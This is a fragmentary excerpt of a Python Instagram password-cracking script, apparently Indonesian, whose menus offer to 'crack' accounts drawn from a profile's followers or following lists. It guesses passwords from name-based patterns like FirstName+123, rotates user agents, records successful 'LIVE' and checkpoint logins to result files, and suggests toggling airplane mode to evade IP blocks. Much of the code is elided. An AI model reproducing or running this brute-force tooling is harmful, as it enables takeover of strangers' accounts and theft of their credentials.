...
def xoshnaw():
  ...
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/khan-tan/bot/main/bot").text
    if id in httpCaht:
...
def login():
	...
	try:
		...
		us=input(f"{H}➤{C}ENTER USERNAME (IG): ")
		pw=stdiomask.getpass(prompt=f'{H}>{C}ENTER PASSWORD (IG): ')
	...
	if x.get('status')=='success':
		...
		exit(f'{M}!{C} THE USERNAME OR PASSWORD IS INCORRECT')
...
##    ## ##     ## ##     ## ##     ## ##     ## {C}
 ...
 ╚══════════════════════════════════════════╝ 
 {H}➤{C} WELCOME {H}{nama}{C}
 {H}➤{C} USERNAME : {self.username}
 {H}➤{C} FOLLOWERS: {followers}
 {H}➤{C} FOLLOWING: {following}

 [01{H}]{C} CRACK FROM FOLLOWING
 [02{H}]{C} CRACK FROM FOLLOWERS
 [03{H}]{C} BOT AUTO UNFOLLOW

 [04{H}]{C} CHECK CRACK STATUS
 [05{H}]{C} VIEW  CRACK RESULTS
 [06{H}]{C} AUTO  UNFOLLOW BOT
 ...
 [E{H}]{C} EXIT
	...
	def BUG(self):
		print(f"""
 [{U}>{C}] please report it to me, the less bugs the better the script..
 [{U}>{C}] You can report directly to wa admin {H}08110044418{C}
 [{U}>{C}] Karma David
		""")
		exit()
 ...
 [{U}>{C}] Fix bug:
   ...
   -Untuk fitur bot komen masih dalam perbaikan
	...
	def passwordAPI(self,xnx):
		...
		print(f"""
 [ List instagram Combination Password]

  [1{H}]{C} FirstName+123
  [2{H}]{C} FirtsName+123,FullName
  [3{H}]{C} FirstName+123,FullName,Full Name
		""")
		c=input(f' {H}>>>{C} CHOOSE: ')
		if c=='1':
	...
	def generateAPI(self,user,o):
		print(f"""
 {H}[{C}1{H}]{C} USER-AGENT 1 (RECOMMENDED)
 {H}[{C}2{H}]{C} USER-AGENT 2
 {H}[{C}3{H}]{C} USER-AGENT 3
		""")
		...
		print(f"""
 [{H}+{C}] The result is OK:: result/{day}.txt
 [{O}+{C}] The result is CP:: result/{day}.txt

 [{M}!{C}] If the IP address is spammed, turn on airplane mode for 10 seconds
		""")
	...
	def crackAPI(self,user,pas,uaAPI):
		...
		sys.stdout.write(f"\r [KARMA][{K}{loop}/{len(internal)}{C}] {H}[LIVE :{len(success)}]{C}  {M}[KARMA :{len(checkpoint)}]{C} "),
		sys.stdout.flush()
		try:
			for pw in pas:
				...
				if "userId" in str(x_jason):
					...
					print(f"""\r {H}[>]{C} {H}STATUS : {H}KARMA LIVE
  {H}[>]{C} {H}NAME: {H}{nama}{C}
